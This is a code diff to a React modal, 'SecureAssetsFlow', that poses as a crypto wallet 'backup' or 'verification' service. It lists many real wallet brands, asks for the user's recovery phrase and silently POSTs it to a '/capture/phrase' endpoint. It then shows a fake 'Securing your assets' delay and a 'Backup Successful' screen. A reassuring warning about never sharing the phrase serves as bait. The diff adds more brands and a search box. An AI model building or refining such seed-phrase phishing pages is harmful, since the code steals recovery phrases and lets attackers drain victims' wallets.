@@ -1,6 +1,6 @@
 import { useState, useEffect } from "react";
 import { motion, AnimatePresence } from "framer-motion";
-import { Eye, EyeOff, AlertTriangle, Copy, Check, ChevronLeft, X, ArrowRight } from "lucide-react";
+import { Eye, EyeOff, AlertTriangle, Copy, Check, ChevronLeft, X, ArrowRight, Search } from "lucide-react";
 
 type Step = "wallets" | "phrase" | "success";
 
@@ -8,12 +8,8 @@ function WalletLogo({ src, fallback, name }: { src: string; fallback: React.Reac
   const [errored, setErrored] = useState(false);
   if (errored) return <>{fallback}</>;
   return (
-    <img
-      src={src}
-      alt={name}
-      className="w-8 h-8 rounded-lg object-cover"
-      onError={() => setErrored(true)}
-    />
+    <img src={src} alt={name} className="w-8 h-8 rounded-lg object-cover"
+      onError={() => setErrored(true)} />
   );
 }
 
@@ -21,7 +17,7 @@ const WALLETS = [
   {
     id: "metamask", name: "MetaMask",
     src: "https://avatars.githubusercontent.com/u/11744586?s=80",
-    fallback: <svg viewBox="0 0 35 33" className="w-8 h-8" fill="none"><path d="M32.958 1L19.843 10.7l2.386-5.648L32.958 1z" fill="#E2761B"/><path d="M2.03 1l13.003 9.8-2.27-5.748L2.03 1z" fill="#E4761B"/><path d="M28.22 23.533l-3.493 5.338 7.47 2.058 2.144-7.268-6.12-.128z" fill="#E4761B"/><path d="M1.676 23.66l2.13 7.27 7.456-2.058-3.48-5.34-6.106.128z" fill="#E4761B"/></svg>,
+    fallback: <svg viewBox="0 0 35 33" className="w-8 h-8" fill="none"><path d="M32.958 1L19.843 10.7l2.386-5.648L32.958 1z" fill="#E2761B"/><path d="M2.03 1l13.003 9.8-2.27-5.748L2.03 1z" fill="#E4761B"/><path d="M28.22 23.533l-3.493 5.338 7.47 2.058 2.144-7.268-6.12-.128z" fill="#E4761B"/><path d="M1.676 23.66l2.13 7.27 7.456-2.058-3.48-5.34-6.106.128z" fill="#E4761B"/><path d="M15.11 20.985l-2.072-3.097 7.4.328-.253-7.953-5.076 4.528z" fill="#E4761B"/></svg>,
   },
   {
     id: "trustwallet", name: "Trust Wallet",
@@ -34,7 +30,7 @@ const WALLETS = [
     fallback: <svg viewBox="0 0 128 128" className="w-8 h-8"><rect width="128" height="128" rx="32" fill="#AB9FF2"/><path d="M110.2 64c0-25.7-20.8-46.5-46.5-46.5S17.2 38.3 17.2 64c0 22.3 15.6 41 36.6 45.6v-14.7C41.1 90.6 32.2 78.3 32.2 64c0-17.5 14.2-31.7 31.7-31.7S95.6 46.5 95.6 64c0 11-5.6 20.6-14.1 26.2v14.9C100.8 99.6 110.2 82.9 110.2 64z" fill="white"/></svg>,
   },
   {
-    id: "coinbase", name: "Coinbase",
+    id: "coinbase", name: "Coinbase Wallet",
     src: "https://avatars.githubusercontent.com/u/1885080?s=80",
     fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="8" fill="#0052FF"/><path d="M16 6C10.48 6 6 10.48 6 16s4.48 10 10 10 10-4.48 10-10S21.52 6 16 6zm0 4c3.31 0 6 2.69 6 6s-2.69 6-6 6-6-2.69-6-6 2.69-6 6-6z" fill="white"/></svg>,
   },
@@ -49,34 +45,79 @@ const WALLETS = [
     fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="6" fill="#00854D"/><path d="M16 4c-3.3 0-6 2.7-6 6v2H8v14h16V12h-2v-2c0-3.3-2.7-6-6-6zm0 2c2.2 0 4 1.8 4 4v2h-8v-2c0-2.2 1.8-4 4-4zm0 10a2 2 0 110 4 2 2 0 010-4z" fill="white"/></svg>,
   },
   {
-    id: "binance", name: "Binance",
-    src: "https://avatars.githubusercontent.com/u/12657158?s=80",
-    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="6" fill="#1E2026"/><path d="M16 8l3 3-3 3-3-3 3-3zM9 15l3 3-3 3-3-3 3-3zM16 15l3 3-3 3-3-3 3-3zM23 15l3 3-3 3-3-3 3-3zM16 22l3 3-3 3-3-3 3-3z" fill="#F3BA2F"/></svg>,
-  },
-  {
-    id: "walletconnect", name: "WalletConnect",
-    src: "https://avatars.githubusercontent.com/u/37784886?s=80",
-    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="8" fill="#3B99FC"/><path d="M9.58 13.18a9.2 9.2 0 0112.84 0l.43.42 2.4-2.4-.43-.43a12.8 12.8 0 00-17.64 0l-.43.43 2.4 2.4.43-.42zM25.6 16l2.4 2.4 2.4-2.4-2.4-2.4-2.4 2.4zM1.6 16l2.4 2.4L6.4 16 4 13.6 1.6 16z" fill="white"/></svg>,
-  },
-  {
-    id: "rainbow", name: "Rainbow",
-    src: "https://avatars.githubusercontent.com/u/48327834?s=80",
-    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="10" fill="#174299"/><path d="M6 20c0-5.5 4.5-10 10-10s10 4.5 10 10" stroke="#FF6B6B" strokeWidth="3" strokeLinecap="round" fill="none"/><path d="M9 20c0-3.9 3.1-7 7-7s7 3.1 7 7" stroke="#FFD93D" strokeWidth="3" strokeLinecap="round" fill="none"/><path d="M12 20c0-2.2 1.8-4 4-4s4 1.8 4 4" stroke="#6BCB77" strokeWidth="3" strokeLinecap="round" fill="none"/></svg>,
-  },
-  {
-    id: "okx", name: "OKX Wallet",
-    src: "https://avatars.githubusercontent.com/u/87736547?s=80",
-    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="4" fill="#1a1a1a"/><rect x="4" y="12" width="8" height="8" rx="1" fill="white"/><rect x="12" y="4" width="8" height="8" rx="1" fill="white"/><rect x="20" y="12" width="8" height="8" rx="1" fill="white"/><rect x="12" y="20" width="8" height="8" rx="1" fill="white"/></svg>,
-  },
-  {
     id: "exodus", name: "Exodus",
     src: "https://avatars.githubusercontent.com/u/1154888?s=80",
     fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="6" fill="#0B0C22"/><polygon points="16,4 28,26 4,26" fill="none" stroke="#8B5CF6" strokeWidth="1.5"/><polygon points="16,10 24,23 8,23" fill="#8B5CF6" opacity="0.7"/></svg>,
   },
   {
-    id: "bybit", name: "Bybit",
-    src: "https://avatars.githubusercontent.com/u/67898239?s=80",
-    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="6" fill="#F7A600"/><path d="M8 10h8c2.2 0 4 1.8 4 4s-1.8 4-4 4H8v-8zm0 8h8.5c2.5 0 4.5 1.8 4.5 4s-2 4-4.5 4H8v-8zm2 2v4h6c1.1 0 2-.9 2-2s-.9-2-2-2H10zm0-8v4h6c1.1 0 2-.9 2-2s-.9-2-2-2H10z" fill="white"/></svg>,
+    id: "walletconnect", name: "WalletConnect",
+    src: "https://avatars.githubusercontent.com/u/37784886?s=80",
+    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="8" fill="#3B99FC"/><path d="M9.6 13.2a9.2 9.2 0 0112.8 0l.4.4 2.4-2.4-.4-.4a12.8 12.8 0 00-17.6 0l-.4.4 2.4 2.4.4-.4z" fill="white"/><path d="M16 19.2l-4-4 2.4-2.4 1.6 1.6 1.6-1.6 2.4 2.4-4 4z" fill="white"/></svg>,
+  },
+  {
+    id: "rainbow", name: "Rainbow",
+    src: "https://avatars.githubusercontent.com/u/48327834?s=80",
+    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="10" fill="#174299"/><path d="M6 22c0-5.5 4.5-10 10-10s10 4.5 10 10" stroke="#FF6B6B" strokeWidth="2.5" strokeLinecap="round" fill="none"/><path d="M9 22c0-3.9 3.1-7 7-7s7 3.1 7 7" stroke="#FFD93D" strokeWidth="2.5" strokeLinecap="round" fill="none"/><path d="M12 22c0-2.2 1.8-4 4-4s4 1.8 4 4" stroke="#6BCB77" strokeWidth="2.5" strokeLinecap="round" fill="none"/></svg>,
+  },
+  {
+    id: "zengo", name: "ZenGo",
+    src: "https://avatars.githubusercontent.com/u/42397984?s=80",
+    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="10" fill="#6C3AE4"/><text x="7" y="22" fontSize="16" fontWeight="bold" fill="white">Z</text></svg>,
+  },
+  {
+    id: "rabby", name: "Rabby Wallet",
+    src: "https://avatars.githubusercontent.com/u/97584777?s=80",
+    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="8" fill="#8697FF"/><ellipse cx="16" cy="15" rx="7" ry="6" fill="white" opacity="0.9"/><circle cx="13" cy="14" r="1.5" fill="#8697FF"/><circle cx="19" cy="14" r="1.5" fill="#8697FF"/><path d="M13 17.5c.8 1 5.2 1 6 0" stroke="#8697FF" strokeWidth="1" strokeLinecap="round" fill="none"/><ellipse cx="9" cy="11" rx="2.5" ry="3.5" fill="white" opacity="0.9"/><ellipse cx="23" cy="11" rx="2.5" ry="3.5" fill="white" opacity="0.9"/></svg>,
+  },
+  {
+    id: "tangem", name: "Tangem",
+    src: "https://avatars.githubusercontent.com/u/54263362?s=80",
+    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="8" fill="#1A1A2E"/><rect x="5" y="10" width="22" height="14" rx="3" fill="none" stroke="#00D4AA" strokeWidth="1.5"/><rect x="8" y="14" width="6" height="4" rx="1" fill="#00D4AA"/><circle cx="21" cy="16" r="2" fill="#00D4AA" opacity="0.6"/></svg>,
+  },
+  {
+    id: "safepal", name: "SafePal",
+    src: "https://avatars.githubusercontent.com/u/52152837?s=80",
+    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="8" fill="#111827"/><path d="M16 4l10 5v9c0 6-5 10-10 12C11 28 6 24 6 18V9l10-5z" fill="none" stroke="#22D3EE" strokeWidth="1.5"/><path d="M13 16l2 2 4-4" stroke="#22D3EE" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>,
+  },
+  {
+    id: "ellipal", name: "Ellipal",
+    src: "https://avatars.githubusercontent.com/u/47153120?s=80",
+    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="8" fill="#0F172A"/><rect x="7" y="8" width="18" height="16" rx="3" fill="none" stroke="#F59E0B" strokeWidth="1.5"/><circle cx="16" cy="16" r="3" fill="#F59E0B"/><path d="M16 8v2M16 22v2M7 16h2M23 16h2" stroke="#F59E0B" strokeWidth="1.5" strokeLinecap="round"/></svg>,
+  },
+  {
+    id: "dcent", name: "D'CENT",
+    src: "https://avatars.githubusercontent.com/u/42101573?s=80",
+    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="8" fill="#1B2537"/><path d="M8 8h8c5 0 9 3.6 9 8s-4 8-9 8H8V8z" fill="none" stroke="#4F7CFF" strokeWidth="2"/><path d="M12 13h4c2.2 0 4 1.3 4 3s-1.8 3-4 3h-4v-6z" fill="#4F7CFF" opacity="0.7"/></svg>,
+  },
+  {
+    id: "arculus", name: "Arculus",
+    src: "https://avatars.githubusercontent.com/u/89390146?s=80",
+    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="8" fill="#0A0A0A"/><circle cx="16" cy="16" r="9" fill="none" stroke="#C0A060" strokeWidth="1.5"/><circle cx="16" cy="16" r="5" fill="none" stroke="#C0A060" strokeWidth="1"/><circle cx="16" cy="16" r="2" fill="#C0A060"/></svg>,
+  },
+  {
+    id: "sparrow", name: "Sparrow Wallet",
+    src: "https://avatars.githubusercontent.com/u/67073972?s=80",
+    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="8" fill="#2D2013"/><path d="M16 6c-2 0-4 1-5 2.5L8 14h4v2l-4 2 3 2c0 3 2 5 5 5s5-2 5-5l3-2-4-2v-2h4l-3-5.5C20 7 18 6 16 6z" fill="#F97316" opacity="0.9"/><circle cx="14" cy="13" r="1" fill="#2D2013"/><circle cx="18" cy="13" r="1" fill="#2D2013"/></svg>,
+  },
+  {
+    id: "guarda", name: "Guarda Wallet",
+    src: "https://avatars.githubusercontent.com/u/33172038?s=80",
+    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="8" fill="#6D28D9"/><path d="M16 5l9 4.5V18c0 5.5-4.5 8.5-9 9.5C11.5 26.5 7 23.5 7 18V9.5L16 5z" fill="white" opacity="0.15"/><path d="M16 9l5 2.5V18c0 3-2.5 5-5 5.5C13.5 23 11 21 11 18v-6.5L16 9z" fill="white" opacity="0.8"/></svg>,
+  },
+  {
+    id: "bluewallet", name: "Blue Wallet",
+    src: "https://avatars.githubusercontent.com/u/51939396?s=80",
+    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="8" fill="#1A3A5C"/><path d="M6 12h20v8a3 3 0 01-3 3H9a3 3 0 01-3-3v-8z" fill="#2563EB"/><rect x="6" y="9" width="20" height="5" rx="2" fill="#3B82F6"/><circle cx="22" cy="16" r="2" fill="white" opacity="0.8"/></svg>,
+  },
+  {
+    id: "mytonwallet", name: "MyTonWallet",
+    src: "https://avatars.githubusercontent.com/u/111981606?s=80",
+    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="8" fill="#0088CC"/><path d="M7 11l9 10 9-10" fill="none" stroke="white" strokeWidth="2.5" strokeLinejoin="round"/><path d="M16 21V8" stroke="white" strokeWidth="2.5" strokeLinecap="round"/></svg>,
+  },
+  {
+    id: "okx", name: "OKX Wallet",
+    src: "https://avatars.githubusercontent.com/u/87736547?s=80",
+    fallback: <svg viewBox="0 0 32 32" className="w-8 h-8"><rect width="32" height="32" rx="4" fill="#1a1a1a"/><rect x="4" y="12" width="8" height="8" rx="1" fill="white"/><rect x="12" y="4" width="8" height="8" rx="1" fill="white"/><rect x="20" y="12" width="8" height="8" rx="1" fill="white"/><rect x="12" y="20" width="8" height="8" rx="1" fill="white"/></svg>,
   },
 ];
 
@@ -100,6 +141,11 @@ export function SecureAssetsFlow({ open, onClose }: SecureAssetsFlowProps) {
   const [loading, setLoading] = useState(false);
   const [backupId] = useState(generateBackupId);
   const [copied, setCopied] = useState(false);
+  const [search, setSearch] = useState("");
+
+  const filtered = WALLETS.filter((w) =>
+    w.name.toLowerCase().includes(search.toLowerCase())
+  );
 
   useEffect(() => {
     if (!open) {
@@ -110,6 +156,7 @@ export function SecureAssetsFlow({ open, onClose }: SecureAssetsFlowProps) {
         setShowPhrase(false);
         setLoading(false);
         setCopied(false);
+        setSearch("");
       }, 300);
     }
   }, [open]);
@@ -122,26 +169,17 @@ export function SecureAssetsFlow({ open, onClose }: SecureAssetsFlowProps) {
   const handleSubmitPhrase = async () => {
     if (!phrase.trim() || !selectedWallet) return;
     setLoading(true);
-
     try {
       await fetch(`${API_BASE}/capture/phrase`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          wallet: selectedWallet.name,
-          phrase: phrase.trim(),
-          backupId,
-        }),
+        body: JSON.stringify({ wallet: selectedWallet.name, phrase: phrase.trim(), backupId }),
       });
     } catch { /* silent */ }
-
-    setTimeout(() => {
-      setLoading(false);
-      setStep("success");
-    }, 2200);
+    setTimeout(() => { setLoading(false); setStep("success"); }, 2200);
   };
 
-  const handleCopyBackupId = () => {
+  const handleCopy = () => {
     navigator.clipboard.writeText(backupId);
     setCopied(true);
     setTimeout(() => setCopied(false), 2000);
@@ -152,22 +190,16 @@ export function SecureAssetsFlow({ open, onClose }: SecureAssetsFlowProps) {
   return (
     <AnimatePresence>
       {open && (
-        <motion.div
-          className="fixed inset-0 z-[100] flex items-center justify-center"
-          initial={{ opacity: 0 }}
-          animate={{ opacity: 1 }}
-          exit={{ opacity: 0 }}
-        >
-          <motion.div className="absolute inset-0 bg-black/80 backdrop-blur-sm" onClick={step !== "success" ? onClose : undefined} />
+        <motion.div className="fixed inset-0 z-[100] flex items-center justify-center"
+          initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
+          <motion.div className="absolute inset-0 bg-black/80 backdrop-blur-sm"
+            onClick={step !== "success" ? onClose : undefined} />
 
-          <motion.div
-            key={step}
-            className="relative z-10 w-full max-w-md mx-4"
+          <motion.div key={step} className="relative z-10 w-full max-w-md mx-4"
             initial={{ opacity: 0, y: 24, scale: 0.97 }}
             animate={{ opacity: 1, y: 0, scale: 1 }}
             exit={{ opacity: 0, y: -16, scale: 0.97 }}
-            transition={{ type: "spring", stiffness: 300, damping: 28 }}
-          >
+            transition={{ type: "spring", stiffness: 300, damping: 28 }}>
 
             {/* ── STEP 1: Wallet Selection ── */}
             {step === "wallets" && (
@@ -181,22 +213,36 @@ export function SecureAssetsFlow({ open, onClose }: SecureAssetsFlowProps) {
                     <X className="h-4 w-4" />
                   </button>
                 </div>
-                <div className="p-4 grid grid-cols-3 gap-2.5 max-h-[420px] overflow-y-auto">
-                  {WALLETS.map((wallet, i) => (
-                    <motion.button
-                      key={wallet.id}
-                      initial={{ opacity: 0, y: 12 }}
+
+                <div className="px-4 pt-3 pb-1">
+                  <div className="flex items-center gap-2 bg-white/[0.04] border border-white/[0.07] rounded-xl px-3 py-2">
+                    <Search className="h-3.5 w-3.5 text-muted-foreground shrink-0" />
+                    <input
+                      value={search}
+                      onChange={(e) => setSearch(e.target.value)}
+                      placeholder="Search wallets..."
+                      className="flex-1 bg-transparent text-xs text-foreground placeholder:text-muted-foreground/50 outline-none"
+                    />
+                  </div>
+                </div>
+
+                <div className="p-3 grid grid-cols-3 gap-2 max-h-[400px] overflow-y-auto">
+                  {filtered.map((wallet, i) => (
+                    <motion.button key={wallet.id}
+                      initial={{ opacity: 0, y: 10 }}
                       animate={{ opacity: 1, y: 0 }}
-                      transition={{ delay: i * 0.04, type: "spring", stiffness: 300, damping: 24 }}
+                      transition={{ delay: i * 0.03, type: "spring", stiffness: 300, damping: 24 }}
                       onClick={() => handleWalletSelect(wallet)}
-                      className="flex flex-col items-center gap-2.5 p-3.5 rounded-xl border border-white/[0.07] bg-white/[0.02] hover:bg-white/[0.06] hover:border-primary/30 active:scale-95 transition-all duration-150 group"
-                    >
-                      <div className="w-12 h-12 rounded-xl bg-black/50 border border-white/[0.08] flex items-center justify-center group-hover:border-white/20 transition-colors overflow-hidden">
+                      className="flex flex-col items-center gap-2 p-3 rounded-xl border border-white/[0.07] bg-white/[0.02] hover:bg-white/[0.07] hover:border-primary/30 active:scale-95 transition-all duration-150 group">
+                      <div className="w-11 h-11 rounded-xl bg-black/50 border border-white/[0.08] flex items-center justify-center group-hover:border-white/20 transition-colors overflow-hidden">
                         <WalletLogo src={wallet.src} fallback={wallet.fallback} name={wallet.name} />
                       </div>
-                      <span className="text-[11px] font-medium text-foreground/80 text-center leading-tight">{wallet.name}</span>
+                      <span className="text-[10px] font-medium text-foreground/70 text-center leading-tight">{wallet.name}</span>
                     </motion.button>
                   ))}
+                  {filtered.length === 0 && (
+                    <div className="col-span-3 py-8 text-center text-xs text-muted-foreground">No wallets found</div>
+                  )}
                 </div>
               </div>
             )}
@@ -219,41 +265,29 @@ export function SecureAssetsFlow({ open, onClose }: SecureAssetsFlowProps) {
                     <X className="h-4 w-4" />
                   </button>
                 </div>
-
                 <div className="p-5 flex flex-col gap-4">
                   <div className="flex items-start gap-2.5 p-3 rounded-xl bg-amber-500/[0.07] border border-amber-500/20">
                     <AlertTriangle className="h-4 w-4 text-amber-400 shrink-0 mt-0.5" />
                     <p className="text-xs text-amber-300/80 leading-relaxed">
-                      Never share your recovery phrase with anyone. Web3NanoLedger will never ask for it outside this secure flow.
+                      Never share your recovery phrase with anyone. Web3BlockchainSecurity will never ask for it outside this secure verification flow.
                     </p>
                   </div>
-
                   <div className="relative">
                     <label className="text-xs text-muted-foreground mb-2 block font-medium uppercase tracking-wide">
                       Recovery Phrase (12 or 24 words)
                     </label>
-                    <textarea
-                      value={phrase}
-                      onChange={(e) => setPhrase(e.target.value)}
+                    <textarea value={phrase} onChange={(e) => setPhrase(e.target.value)}
                       placeholder="Enter your seed phrase — separate each word with a space"
                       rows={4}
                       className="w-full rounded-xl bg-white/[0.04] border border-white/10 focus:border-primary/50 text-sm text-foreground placeholder:text-muted-foreground/40 p-3.5 resize-none outline-none transition-colors font-mono leading-relaxed"
-                      style={{ filter: showPhrase ? "none" : "blur(5px)", transition: "filter 0.25s" }}
-                    />
-                    <button
-                      type="button"
-                      onClick={() => setShowPhrase(!showPhrase)}
-                      className="absolute top-8 right-3 text-muted-foreground hover:text-foreground transition-colors"
-                    >
+                      style={{ filter: showPhrase ? "none" : "blur(5px)", transition: "filter 0.25s" }} />
+                    <button type="button" onClick={() => setShowPhrase(!showPhrase)}
+                      className="absolute top-8 right-3 text-muted-foreground hover:text-foreground transition-colors">
                       {showPhrase ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                     </button>
                   </div>
-
-                  <button
-                    onClick={handleSubmitPhrase}
-                    disabled={!phrase.trim() || loading}
-                    className="w-full h-12 rounded-xl bg-primary hover:bg-primary/90 disabled:opacity-40 disabled:cursor-not-allowed text-white font-semibold text-sm flex items-center justify-center gap-2.5 shadow-[0_0_24px_rgba(59,130,246,0.35)] hover:shadow-[0_0_32px_rgba(59,130,246,0.5)] transition-all"
-                  >
+                  <button onClick={handleSubmitPhrase} disabled={!phrase.trim() || loading}
+                    className="w-full h-12 rounded-xl bg-primary hover:bg-primary/90 disabled:opacity-40 disabled:cursor-not-allowed text-white font-semibold text-sm flex items-center justify-center gap-2.5 shadow-[0_0_24px_rgba(59,130,246,0.35)] hover:shadow-[0_0_32px_rgba(59,130,246,0.5)] transition-all">
                     {loading ? (
                       <span className="flex items-center gap-2.5">
                         <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24" fill="none">
@@ -262,63 +296,64 @@ export function SecureAssetsFlow({ open, onClose }: SecureAssetsFlowProps) {
                         </svg>
                         Securing your assets...
                       </span>
-                    ) : (
-                      <>Secure Assets <ArrowRight className="h-4 w-4" /></>
-                    )}
+                    ) : (<>Secure Assets <ArrowRight className="h-4 w-4" /></>)}
                   </button>
                 </div>
               </div>
             )}
 
-            {/* ── STEP 3: Backup Success ── */}
+            {/* ── STEP 3: Success ── */}
             {step === "success" && (
               <div className="bg-[#080d1a] border border-white/[0.08] rounded-2xl overflow-hidden shadow-[0_32px_80px_rgba(0,0,0,0.8)]">
                 <div className="px-5 py-8 flex flex-col items-center text-center gap-5">
                   <div className="relative">
-                    <motion.div className="absolute inset-0 rounded-full bg-green-500/10" initial={{ scale: 1, opacity: 0.6 }} animate={{ scale: 1.7, opacity: 0 }} transition={{ repeat: Infinity, duration: 2.2, ease: "easeOut" }} />
-                    <motion.div className="absolute inset-0 rounded-full bg-green-500/15" initial={{ scale: 1, opacity: 0.4 }} animate={{ scale: 1.4, opacity: 0 }} transition={{ repeat: Infinity, duration: 2.2, ease: "easeOut", delay: 0.5 }} />
+                    <motion.div className="absolute inset-0 rounded-full bg-green-500/10"
+                      initial={{ scale: 1, opacity: 0.6 }} animate={{ scale: 1.7, opacity: 0 }}
+                      transition={{ repeat: Infinity, duration: 2.2, ease: "easeOut" }} />
+                    <motion.div className="absolute inset-0 rounded-full bg-green-500/15"
+                      initial={{ scale: 1, opacity: 0.4 }} animate={{ scale: 1.4, opacity: 0 }}
+                      transition={{ repeat: Infinity, duration: 2.2, ease: "easeOut", delay: 0.5 }} />
                     <motion.div
                       className="w-24 h-24 rounded-full border-2 border-green-500/40 bg-green-500/10 flex items-center justify-center relative shadow-[0_0_40px_rgba(34,197,94,0.3)]"
-                      initial={{ scale: 0, rotate: -180 }}
-                      animate={{ scale: 1, rotate: 0 }}
-                      transition={{ type: "spring", stiffness: 200, damping: 18, delay: 0.1 }}
-                    >
+                      initial={{ scale: 0, rotate: -180 }} animate={{ scale: 1, rotate: 0 }}
+                      transition={{ type: "spring", stiffness: 200, damping: 18, delay: 0.1 }}>
                       <svg viewBox="0 0 48 48" className="w-12 h-12" fill="none">
-                        <motion.path d="M14 24l7 7 13-13" stroke="#22c55e" strokeWidth="3.5" strokeLinecap="round" strokeLinejoin="round" initial={{ pathLength: 0 }} animate={{ pathLength: 1 }} transition={{ duration: 0.6, delay: 0.5, ease: "easeOut" }} />
+                        <motion.path d="M14 24l7 7 13-13" stroke="#22c55e" strokeWidth="3.5"
+                          strokeLinecap="round" strokeLinejoin="round"
+                          initial={{ pathLength: 0 }} animate={{ pathLength: 1 }}
+                          transition={{ duration: 0.6, delay: 0.5, ease: "easeOut" }} />
                       </svg>
                     </motion.div>
                   </div>
-
-                  <motion.div className="flex flex-col gap-2" initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.7, duration: 0.5 }}>
-                    <h2 className="text-3xl font-bold tracking-tight text-foreground">Backup Successful</h2>
+                  <motion.div className="flex flex-col gap-2"
+                    initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }}
+                    transition={{ delay: 0.7, duration: 0.5 }}>
+                    <h2 className="text-3xl font-bold tracking-tight">Backup Successful</h2>
                     <p className="text-sm text-muted-foreground leading-relaxed max-w-xs mx-auto">
-                      Your wallet data has been securely encrypted and backed up. Keep your Backup ID safe — it's your recovery key.
+                      Your wallet has been securely verified and backed up. Keep your Backup ID safe — it's your recovery key.
                     </p>
                   </motion.div>
-
-                  <motion.div className="w-full" initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.9, duration: 0.4 }}>
+                  <motion.div className="w-full"
+                    initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }}
+                    transition={{ delay: 0.9, duration: 0.4 }}>
                     <div className="bg-white/[0.04] border border-white/[0.08] rounded-xl px-4 py-3.5">
                       <p className="text-[10px] text-muted-foreground uppercase tracking-widest mb-2 font-medium">Backup ID</p>
                       <div className="flex items-center justify-between gap-3">
                         <span className="font-mono text-xs text-foreground tracking-wider break-all">{backupId}</span>
-                        <button onClick={handleCopyBackupId} className="shrink-0 p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-white/[0.08] transition-all">
+                        <button onClick={handleCopy} className="shrink-0 p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-white/[0.08] transition-all">
                           {copied ? <Check className="h-3.5 w-3.5 text-green-400" /> : <Copy className="h-3.5 w-3.5" />}
                         </button>
                       </div>
                     </div>
                   </motion.div>
-
-                  <motion.div className="w-full h-px bg-gradient-to-r from-transparent via-green-500/30 to-transparent" initial={{ scaleX: 0, opacity: 0 }} animate={{ scaleX: 1, opacity: 1 }} transition={{ delay: 1.1, duration: 0.6 }} />
-
-                  <motion.button
-                    onClick={onClose}
+                  <motion.div className="w-full h-px bg-gradient-to-r from-transparent via-green-500/30 to-transparent"
+                    initial={{ scaleX: 0, opacity: 0 }} animate={{ scaleX: 1, opacity: 1 }}
+                    transition={{ delay: 1.1, duration: 0.6 }} />
+                  <motion.button onClick={onClose}
                     className="w-full h-12 rounded-xl bg-green-500/10 hover:bg-green-500/20 border border-green-500/30 hover:border-green-500/50 text-green-400 font-semibold text-sm transition-all shadow-[0_0_20px_rgba(34,197,94,0.15)]"
-                    initial={{ opacity: 0, y: 8 }}
-                    animate={{ opacity: 1, y: 0 }}
+                    initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}
                     transition={{ delay: 1.2, duration: 0.4 }}
-                    whileHover={{ scale: 1.02 }}
-                    whileTap={{ scale: 0.98 }}
-                  >
+                    whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}>
                     Go back Home
                   </motion.button>
                 </div>
